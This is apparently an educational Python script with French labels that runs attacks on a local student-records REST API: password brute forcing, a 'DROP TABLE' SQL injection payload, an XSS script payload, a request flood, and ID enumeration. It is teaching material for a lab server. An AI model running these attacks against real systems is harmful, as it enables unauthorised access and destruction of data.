import requests
from requests.auth import HTTPBasicAuth
import time

BASE_URL = 'http://localhost:5000'

def attaque_brute_force():
    print("\n1. BRUTE FORCE - Attaque sur l'authentification")
    print("-" * 50)
    
    passwords = ['123456', 'password', 'admin', 'password123', '12345678']
    
    for pwd in passwords:
        try:
            response = requests.post(
                f"{BASE_URL}/api/etudiants",
                json={'id': 99, 'nom': 'Test', 'prenom': 'Test', 'filiere': 'Test'},
                auth=HTTPBasicAuth('admin', pwd),
                timeout=2
            )
            if response.status_code == 201:
                print(f"  [SUCCES] Mot de passe trouve: {pwd}")
                break
            else:
                print(f"  [ECHEC] Tentative avec: {pwd}")
        except:
            print(f"  [ERREUR] Tentative avec: {pwd}")
    
    print("  Impact: Acces non autorise au systeme")


def attaque_injection_sql():
    print("\n2. INJECTION SQL")
    print("-" * 50)
    
    payload = "1; DROP TABLE etudiants; --"
    
    try:
        response = requests.post(
            f"{BASE_URL}/api/debug/sql",
            json={'query': payload},
            timeout=2
        )
        print(f"  Payload: {payload}")
        print(f"  Reponse: {response.json()}")
        print("  Impact: Manipulation ou suppression de donnees")
    except Exception as e:
        print(f"  Erreur: {e}")


def attaque_xss():
    print("\n3. CROSS-SITE SCRIPTING (XSS)")
    print("-" * 50)
    
    payload = "<script>alert('XSS')</script>"
    
    try:
        response = requests.post(
            f"{BASE_URL}/api/debug/xss",
            json={'input': payload},
            timeout=2
        )
        print(f"  Payload: {payload}")
        print(f"  Reponse: {response.json()}")
        print("  Impact: Vol de session, phishing")
    except Exception as e:
        print(f"  Erreur: {e}")


def attaque_dos():
    print("\n4. DENI DE SERVICE (DoS)")
    print("-" * 50)
    
    print("  Envoi de 50 requetes rapides...")
    
    start = time.time()
    for i in range(50):
        try:
            requests.get(f"{BASE_URL}/api/etudiants", timeout=1)
        except:
            pass
    
    duration = time.time() - start
    print(f"  {50} requetes en {duration:.2f} secondes")
    print("  Impact: Surcharge du serveur, indisponibilite")


def attaque_idor():
    print("\n5. IDOR - Insecure Direct Object Reference")
    print("-" * 50)
    
    print("  Enumeration des IDs...")
    for id in [1, 2, 3, 999, 1000]:
        try:
            response = requests.get(f"{BASE_URL}/api/etudiants/{id}", timeout=2)
            if response.status_code == 200:
                data = response.json()
                print(f"  [TROUVE] ID {id}: {data['nom']} {data['prenom']}")
            else:
                print(f"  [NON TROUVE] ID {id}")
        except:
            print(f"  [ERREUR] ID {id}")
    
    print("  Impact: Acces a des donnees non autorisees")


def attaque_absence_https():
    print("\n6. ABSENCE DE HTTPS")
    print("-" * 50)
    
    print("  Connexion en HTTP (non chiffre)")
    print(f"  URL: {BASE_URL}")
    print("  Les donnees sont transmises en clair")
    print("  Impact: Interception des identifiants et donnees sensibles")


def main():
    print("\n" + "=" * 50)
    print("DEMONSTRATIONS D'ATTAQUES SUR API REST")
    print("=" * 50)
    print("\nAVERTISSEMENT: Ces attaques sont a des fins educatives uniquement")
    print("Ne jamais utiliser sur des systemes sans autorisation")
    print("\n" + "=" * 50)
    
    try:
        requests.get(f"{BASE_URL}/api/etudiants", timeout=2)
    except:
        print("\nERREUR: Le serveur REST ne repond pas")
        print("Demarrez le serveur avec: python rest/api_rest.py")
        return
    
    attaque_brute_force()
    attaque_injection_sql()
    attaque_xss()
    attaque_dos()
    attaque_idor()
    attaque_absence_https()
    
    print("\n" + "=" * 50)
    print("DEMONSTRATIONS TERMINEES")
    print("=" * 50)


if __name__ == '__main__':
    main()
